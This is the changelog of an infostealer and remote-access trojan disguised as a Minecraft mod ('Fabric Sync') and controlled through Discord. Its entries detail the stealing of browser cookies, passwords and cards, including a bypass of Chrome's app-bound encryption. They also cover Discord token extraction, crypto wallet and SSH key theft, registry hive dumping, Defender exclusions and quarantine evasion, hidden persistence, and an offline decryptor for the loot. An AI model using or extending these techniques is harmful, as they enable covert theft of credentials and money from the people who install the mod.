# Changelog

## 0.2.11

- Discord harvest: the validated `cache/discord/token.txt` is included even if Discord's LevelDB no longer re-reads, and the sibling `Local State` is always part of the raw fallback so v10 blobs stay decryptable offline.
- ABE runs lowercase and verbosely; an empty result now records the exit code instead of a blank `abe_error`.
- Hives also collect `SAM.hiv` and `C:\ProgramData\Microsoft\Crypto\SystemKeys` (Google Chromekey1), needed for offline Chrome flag-3/flag-4 v20 keys.
- `decrypt.py`: correct DPAPI KDF (password -> SHA1 -> SID HMAC), CNG HMAC validation, SYSTEM `S-1-5-18/User` masterkeys, the real SYSTEM->user app-bound chain, Edge/Brave raw 32-byte keys, and Chrome flag 3/4 via `--ksp` (auto-detected under `hives/SystemKeys`). Unknown flags now fail loudly instead of yielding a wrong key.
- `tools/ingest-case.sh` passes `--system-userkey` and `--ksp`, and points `--system-protect` at the extracted hives.

## 0.2.10

- Discord tokens that do not start with `M`/`N` are valid: the regex now accepts the `Nz...` form and the two-segment variant. This was why a correctly decrypted token produced no `token.txt`.
- If every candidate fails `/users/@me`, the first decrypted token is still saved so it can be checked or renewed after a Discord login.


## 0.2.9

- ABE retry: a zero exit without output is now a failure, so the browser-close (`-k`) retry actually runs. The helper captures `abe_log=` for diagnosis.
- `token` command: forces Discord token recovery on demand and writes `cache/discord/token.txt`, so a failed automatic attempt can be retried without a full harvest.
- `decrypt.py --system-protect` accepts the whole `ProtectSystem` folder as well as the `S-1-5-18` child.


## 0.2.8

- ABE resilience: Defender quarantined `chromelevator_x64.exe.tmp` before the move, so every browser failed and no `v20=` was written. Extraction now writes the final filename directly, starts it as soon as possible and retries up to three times on quarantine.
- The no-file PowerShell app-bound unwrap now runs before ABE, so v20 survives even when Defender blocks the elevator; ABE only adds the plaintext TSV.
- Discord: newer builds store the token as a `v10` AES-GCM envelope with a DPAPI-wrapped key in `Local State`. The agent now unwraps that key with `ProtectedData CurrentUser`, decrypts the envelope and validates `/users/@me`; the old DPAPI blob and raw fallback remain.
- `decrypt.py` decrypts those `v10` Discord envelopes with the user masterkey, so an old harvest or a blocked agent can still recover the token with `-p`.
- `tools/ingest-case.sh` gains `--win-password` and `--machinekey` passthrough for incomplete or legacy cases and now removes `decrypted/` with `--clean` after the encrypted archive verifies.


## 0.2.7

- Visible rename to `Fabric Sync`: install directory `%LOCALAPPDATA%\FabricSync`, `cache\`, `runtime.jar`, `javaw.exe`, `startup.vbs`, `update.*`, `session.txt`, `config.json`, `.version`, `logs\update.log`, task `\FabricSync`, channel `sync-<host>-<user>`, embed `Fabric Sync`, `fabric-sync-<version>.jar`, `sync-<ts>.zip`, `cache\system-<ts>.zip`, `cache\elevate.bat`, `screen-<ts>.png` and `out-<ts>.txt`. The mod id stays `serverpackcore`.
- Legacy installs are detected in one place: `ServerPackCore` wins if `FabricSync` does not exist, and keeps the old agent/helper/task names because the deployed helper references them. A fresh install uses the full modern tree.
- ABE v20: ChromElevator v0.20.0 (MIT, pinned SHA-256, `NOTICE`) is embedded, verified, extracted to `cache\tools` and run per browser in the user session. Cookies, passwords, cards, IBANs and Google tokens land in `browsers/<label>/abe/*.tsv`; the decrypted key is `v20=`. Failure leaves `app_bound=` and `abe_error=` and continues with `hives` as fallback.
- Discord token: minimal LevelDB reader with Snappy for `.ldb` and `.log`, `dQw4w9WgXcQ:` extraction, DPAPI `CurrentUser` unwrap and `/users/@me` validation, saved to `discord/token.txt`. Raw dumps remain fallback.
- Bootstrap no longer invokes `hives` or UAC. `hives` stays a manual command with three attempts per run; its elevated script adds persistent Defender exclusions for the install directory, the mods folder, `reg.exe` and `esentutl.exe` before `reg save`.
- Uploads over ~8 MB are split into sorted `.partNN` files; README documents reassembly.
- `decrypt.py` consumes ABE TSV and `discord/token.txt` first, so 0.2.7 v20 and Discord open without `-p` or `--machinekey`.
- `tools/ingest-case.sh` automates reassembly, ZIP verification, extraction, decryption and encrypted archiving of a downloaded case.
- Mod metadata is now `Fabric Sync`, with `archives_base_name=fabric-sync`; the id is unchanged. The install directory is hidden with `attrib +h`, not system.

## 0.2.6

- Harvest: the app-bound key (v20 cookies) is now unwrapped live while the agent runs in the victim session. The outer machine DPAPI layer and the inner user layer are both available to a normal user, so no administrator, no UAC and no `SECURITY.hiv` are needed. `keys.txt` gains `v20=<key>`; `app_bound=` stays as an offline fallback.
- Harvest: the Exodus passphrase is unwrapped the same way when it is a machine DPAPI blob, into `wallets/exodus-passphrase.txt`. A plain passphrase still ships in `passphrase.json`.
- `decrypt.py` consumes `v20=` and `exodus-passphrase.txt` first, then falls back to the existing machinekey paths. The `hives` step is now optional.
- Harvest also keeps `admin/autologon.txt` (`DefaultPassword` when autologon is on) and any leftover `Unattend.xml` as a last resort for the administrator password.
- `hives` is unchanged and still works, now only for offline `secretsdump` and as a fallback.

## 0.2.5

- Hives: `reg save HKLM\\SECURITY` failed when the task ended up running as Administrator instead of SYSTEM, and the zip shipped without it. The script now falls back to `esentutl /y /vss` on the live hive (works with plain Administrator) and aborts with `hives.status` if SECURITY or SYSTEM is still missing.
- The task is registered with `/rl HIGHEST`.

## 0.2.4

- Bootstrap: the hives step packed `SYSTEM.hiv` even when `reg save HKLM\SECURITY` had failed, so `secretsdump` then died on a missing file and the v20 cookies stayed locked. The script now aborts, writes `hives.status` and retries when `SECURITY.hiv` is absent.
- Also delete the `spcdump` task when it aborts, instead of leaving it behind for the next attempt to overwrite.

## 0.2.3

- Fix: the Windows update helper declared `Const CUR` and then `Dim ... cur ...`; VBScript is case insensitive, so `wscript` rejected it with "Nombre redefinido". Renamed to `curPid`.
- Fix: `Const LOG` collided with the built-in `Log()`, same error. Renamed to `LOGFILE`.
- Both Windows scripts are now also run under `wine cscript` before a release, and a test rejects keywords, built-in functions and any name declared twice.

## 0.2.2

- `help` lists the usable commands in the channel.
- `bootstrap` re-runs the whole first-run collection on demand (markers cleared, hives cap reset).

## 0.2.1

- Fix: every Windows agent update since 0.1.4 died before doing anything. The generated helper declared `Const NEW`, and `New` is a VBScript reserved word, so `wscript` rejected the file with "Se esperaba un identificador" and an error dialog. Renamed to `NEWFILE`.
- Fix: the same helper also used `left` as a counter variable while calling `Left()`, shadowing the built-in. Renamed to `remaining`.
- The Windows update script is now asserted against both names.
- Machines stuck on this bug need one manual hop: replace the mod jar by hand, `kill` the agent and start the game, the stager then installs the 0.2.1 agent from the mod.

## 0.2.0

- Harvest: newer Discord builds encrypt the stored token, so no plaintext candidate validates. The raw LevelDB files now ship under `discord/raw/` (2 MB budget) instead of being dropped; the DPAPI blobs in `dpapi/` are enough to decrypt them offline.
- Harvest: `keys.txt` no longer parses `Local State` through PowerShell `ConvertFrom-Json`, which silently failed on Edge. The encrypted key is read in Java and only the DPAPI unwrap is delegated, so Edge gets a key too.
- Harvest: when the unwrap fails, `keys.txt` keeps the wrapped value as `dpapi_key=` instead of losing it.
- Harvest: wallet extension data is stored as `wallets/<browser>/<extension>/<profile>` so Chrome, Edge and Brave no longer overwrite each other.
- Harvest: browser databases now ship with their `-wal` companions, so rows written while the browser is open are no longer lost from the copy.
- Harvest: total zip budget raised from 8 MB to 12 MB.
- Mod: dropped the unread `refmap` entry from the mixins config; Loom already remaps the injection points inline and the warning only confused the log.
- Mod: the stager logs one INFO line when it fires and when it spawns the agent.
- `decrypt.py` is now a full harvest decryptor: DPAPI masterkeys from the password, browser AES keys, v10 and v20 cookies (with the DPAPI_SYSTEM machinekey), saved passwords, Discord tokens, Exodus/Electrum/Phantom and launcher accounts, styled output and a `report.json`. It parses both the classic and the CNG DPAPI blob layout.
- `SHELL.md` with the loot one-liners to run over `shell`.
- `make_fixture.py` builds a synthetic harvest so the decryptor can be exercised end to end without Windows.
- First run collects itself: a background bootstrap (~45-75 s after the agent starts, Windows only) gathers recon, credentials, Wi-Fi, Discord/Telegram/Steam/Firefox sessions, wallets, SSH and cloud keys, a screenshot and, with one UAC, the SYSTEM hives. Each step uploads separately and leaves a marker, so a crash or a declined UAC only retries the unfinished part; the hives stop after three attempts.
- First run also turns `persist` and auto-update on by default; `persist off` or `update auto off` still wins afterwards.
- `shell` is now for specific extras and repairs, see `SHELL.md`.

## 0.1.5

- The update helper keeps watching a restarted agent for 10 minutes after the 20 s stability check (`-Dspc.watchdogSec`, 0 disables).
- A late crash kills survivors, restores the previous agent and records `rollback-late`; the startup marker makes it count one failure and back off.
- Atomic `spc-update.intent` markers distinguish `<action> <agent-pid>`: `stop` and `replace`.
- `kill` during the window stops without a restart (`watchdog-stopped`).
- A newer update takes precedence and the old helper exits (`watchdog-replaced`) instead of fighting it; `update rollback` keeps working in the window.
- A healthy window exits with `watchdog-cleared` and only deletes its own marker.
- The Windows VBS helper mirrors the marker and watchdog logic and is still untested on a real host.
- Includes the 0.1.4 fixes: signed self-update and startup rollback, deferred mod swap, manual rollback, shared update gate, opt-in schedule with backoff, startup rollback marker, and mod repair plus game PID recovery when updating from an older build.
- This 0.1.4 → 0.1.5 hop is still prepared by the 0.1.4 helper, so the watchdog first governs updates made after 0.1.5 is installed.

## 0.1.4

- Signed agent updates: apply, restart and automatic rollback on startup failure.
- Signed mod staging with the swap deferred until the game exits.
- Manual `update rollback` for both artifacts.
- Shared update gate so manual and automatic runs never overlap.
- Opt-in automatic updates: first slot after 10 minutes, then every 24 h ±10 % jitter, backoff 1 h → 2 h → 6 h → 24 h, slots persisted across restarts.
- Rollback marker so a failed startup counts as a failure with backoff.
- The Windows update helper is still untested on a real host.
- Updating from a build without mod support repairs the mod and recovers the game PID.

## 0.1.3

- Discord bot token rotated; 0.1.2 and earlier no longer connect. Manual reinstall required.
- Self-update infrastructure: signed `update.json` manifest, RSA-3072 public key embedded in the agent, release workflow with dry run.
- Discord credentials moved out of the tracked tree into generated `DiscordSecrets`, sourced from `local.properties` or `SPC_*` environment variables.
- `checkSecrets` and `release` Gradle tasks; releases fail fast on placeholders.
- Full Spanish to English translation of commands, messages and documentation.
- Gateway WebSocket transport with per-connection callbacks and REST fallback.
- Gateway hardening: 4014 intent downgrade, resume, backoff with jitter, 429 honoring `retry_after`.
- JUnit suite for the agent (24 tests) and bytecode verification for the mod and agent jars.

## 0.1.2

- Baseline before the release tooling work.
